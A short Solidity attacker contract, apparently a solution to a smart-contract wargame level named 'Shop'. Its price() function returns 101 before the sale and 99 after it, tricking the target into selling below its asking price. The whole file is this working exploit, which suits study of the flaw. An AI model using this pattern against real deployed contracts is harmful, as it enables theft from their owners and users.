// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Shop.sol";

contract Attacker{
    // Use your victim's contract address
    address victim = 0x97943A1af82f5C6898940bCe8CEe79BDa6ba417b;
    Shop public shop;

    constructor() {
        shop = Shop(victim);
    }
    
    function attack() external {
        shop.buy();
    }

    function price() external view returns(uint) {
        if(!shop.isSold())
            return 101;
        else
            return 99;
    }
}